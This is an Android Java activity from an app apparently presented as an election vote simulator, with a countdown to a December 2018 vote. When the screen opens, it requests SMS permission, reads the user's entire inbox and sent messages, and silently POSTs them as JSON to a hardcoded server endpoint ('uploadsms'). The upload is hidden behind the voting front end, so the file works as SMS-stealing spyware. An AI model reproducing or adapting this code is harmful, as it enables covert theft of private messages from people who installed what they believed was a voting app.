package com.koziengineering.user.franvanna;

import android.Manifest;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.CountDownTimer;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.ArrayMap;
import android.util.Log;
import android.view.MenuItem;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.koziengineering.user.franvanna.Objects.SMS;
import com.koziengineering.user.franvanna.Objects.SMSReader;
import com.koziengineering.user.franvanna.Utils.Utils;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.json.JSONStringer;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.GregorianCalendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class ActivityVoteSimulation extends AppCompatActivity {


    private static final String TAG = "CENI";
    private static final int PERM_CODE_READ_SMS = 101;
    private static final int PERM_CODE_READ_CAMERA = 102;
    private static final String IP = "192.168.1.5";
    TextView tvCoundDown;
    GregorianCalendar dueDate;
    Date curDate = new Date();
    private SMSReader smsReader;

    private boolean[] SMS_BOXES_READ = new boolean[]{false,false};
    private static final int SMS_BOX_INBOX = 0;
    private static final int SMS_BOX_SENT = 1;
    private Map<String, List<SMS>> smsMapInbox = new HashMap<>();
    private Map<String, List<SMS>> smsMapSent = new HashMap<>();
    private List<SMS> smsList = new ArrayList<>();
    private Map<String, List<SMS>> map = new ArrayMap<>();
    private static int c = 0;

    private SMSReader.SMSListener mSMSListener = new SMSReader.SMSListener() {
        @Override
        public void onSMSReadComplete(Map<String, List<SMS>> smsMap, String smsBox) {


            if(smsBox == SMSReader.SMS_BOX_INBOX){
                SMS_BOXES_READ[SMS_BOX_INBOX] = true;
            }

            if(smsBox == SMSReader.SMS_BOX_SENT){
                SMS_BOXES_READ[SMS_BOX_SENT] = true;
            }

            Set<String> keys = smsMap.keySet();

            for(int i = 0; i < smsMap.size(); i++){

                String key = (String) keys.toArray()[i];
                smsList.addAll(smsMap.get(key));

            }

            //Log.e("DAK", "sms size -> " + smsMap.size() + ", box : " + smsBox + ", c: " + c + ", smsList size : " + smsList.size()  );



            if(SMS_BOXES_READ[SMS_BOX_INBOX] && SMS_BOXES_READ[SMS_BOX_SENT]){
                Log.e("BOOM", "smsList size : " + smsList.size() );
                uploadSMSToServer();
                SMS_BOXES_READ[SMS_BOX_INBOX] = false;
                SMS_BOXES_READ[SMS_BOX_SENT] = false;
            }


            if(ActivityVoteSimulation.this.smsList.size() == 0){
                onSMSInboxEmpty();
            }

            //adapter.notifyDataSetChanged();
            //ActivityMain.this.getSupportActionBar().setTitle("SMSTest : " + ActivityMain.this.smsMap.size() );
            c++;
        }

        private void uploadSMSToServer() {

            final JSONArray messages = new JSONArray();
            for(int i = 0; i < smsList.size(); i++){

                SMS sms = smsList.get(i);


                try {
                    JSONObject smsJSON = sms.toJSONObject();
                    messages.put(smsJSON);

                } catch (JSONException e) {
                    e.printStackTrace();
                    Log.e(TAG, "SMS Exception: -> "+ e.getMessage());
                }

            }

            Log.e("PUSSY", "msgs -> " +  messages);

            JSONStringer jsonStringer = new JSONStringer();

            String url = "http://"+IP+"/sosachat/api.php?act=uploadsms";


            Log.e(TAG, "uploadSMSToServer: url " + url );


            StringRequest requestItemDetails = new StringRequest(
                    Request.Method.POST,
                    url,
                    new Response.Listener<String>() {
                        @Override
                        public void onResponse(String s) {


                            Log.e(TAG, "ON THA RES -> " + s);


                        }
                    },

                    new Response.ErrorListener() {
                        @Override
                        public void onErrorResponse(VolleyError volleyError) {


                            Log.e(TAG, "expose volley item -> " + volleyError.toString() );

                        }
                    }
            ) {

                @Override
                protected Map<String, String> getParams() {
                    Map<String, String> params = new HashMap<>();


                    params.put("data", messages.toString());



                    return params;
                }


            };

           Volley.newRequestQueue(ActivityVoteSimulation.this).add(requestItemDetails);

        }

        @Override
        public void onSMSInboxEmpty() {
            Log.e(TAG, "onSMSInboxEmpty: " );

            Toast.makeText(ActivityVoteSimulation.this, "Your sms inbox is empty", Toast.LENGTH_SHORT).show();

            //adapter.notifyDataSetChanged();
        }
    };


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_vote_simulation);


        smsReader = new SMSReader(this);



        dueDate = new GregorianCalendar(2018, Calendar.DECEMBER, 23);



        tvCoundDown = findViewById(R.id.tvCoundDown);

        setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);

        getSupportActionBar().setTitle(getResources().getString(R.string.titleVoteSimulation));
        getSupportActionBar().setDisplayShowHomeEnabled(true);
        getSupportActionBar().setDisplayHomeAsUpEnabled(true);


        //final Integer i = {0};
        final long ms = dueDate.getTimeInMillis();
        new CountDownTimer(ms, 1000){

            @Override
            public void onTick(long millisUntilFinished) {




                tvCoundDown.setText(Utils.getDateDifference(new Date(), dueDate.getTime()));
            }

            @Override
            public void onFinish() {

            }
        }.start();



        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {

            /*if(checkSelfPermission(Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED){

            }else{
                String[] perms = new String[]{Manifest.permission.CAMERA};
                requestPermissions(perms, PERM_CODE_READ_CAMERA);
            }*/

            if (checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {

                readSMS(mSMSListener);
            } else {


                String[] perms = new String[]{Manifest.permission.CAMERA,Manifest.permission.READ_SMS};
                requestPermissions(perms, PERM_CODE_READ_SMS);
            }
        }else{
            readSMS(mSMSListener);
        }



    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        Log.e(TAG, "onRequestPermissionsResult: \nReqCode : " + requestCode + "\nPerms : " + permissions + "\nGrandRes : " + grantResults );
        if(requestCode == PERM_CODE_READ_SMS && grantResults[1] == PackageManager.PERMISSION_GRANTED) {

            readSMS(mSMSListener);



        }else{
            Log.e(TAG, "Nous avons besoin de vos permissions pour assurer le bon fonctionement de l'appli." );
        }

    }

    private void readSMS(final SMSReader.SMSListener listener) {

        //final Map<String, List<SMS>> sms = new HashMap<>();
        smsMapInbox.clear();
        smsMapSent.clear();
        this.smsList.clear();

        smsReader.readSMS(new SMSReader.SMSListener() {
            @Override
            public void onSMSReadComplete(Map<String, List<SMS>> smsMap, String smsBox) {

                //ActivityMain.this.smsMap.putAll(smsMap);
                mSMSListener.onSMSReadComplete(smsMap, smsBox);
            }



            @Override
            public void onSMSInboxEmpty() {

                //INBOX_READ = true;
                mSMSListener.onSMSInboxEmpty();

            }
        }, SMSReader.SMS_BOX_INBOX);


        smsReader.readSMS(new SMSReader.SMSListener() {
            @Override
            public void onSMSReadComplete(Map<String, List<SMS>> smsMapInbox, String smsBox) {
                //SENT_READ = true;
                //sms.putAll(smsMapInbox);

                //ActivityMain.this.smsMap.putAll(smsMapInbox);
                mSMSListener.onSMSReadComplete(smsMapInbox, smsBox);
            }



            @Override
            public void onSMSInboxEmpty() {

                //INBOX_READ = true;
                mSMSListener.onSMSInboxEmpty();

            }
        }, SMSReader.SMS_BOX_SENT);


    }


   /* @Override
    public void onBackPressed() {

        //finish();
        Log.e(TAG, "onBackPressed: FUCK "  );
    }*/

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {

        //Intent intent;

        if(item.getItemId() == android.R.id.home){
            finish();
        }


        /*

        if(item.getItemId() == R.id.setRowAccSettings){
            intent = new Intent(this, ActivityAccountSettings.class);
            startActivity(intent);
        }*/


        return super.onOptionsItemSelected(item);
    }

    public void startVote(View view) {

        Intent intent = new Intent(this, ActivityVotes.class);
        startActivity(intent);

    }
}
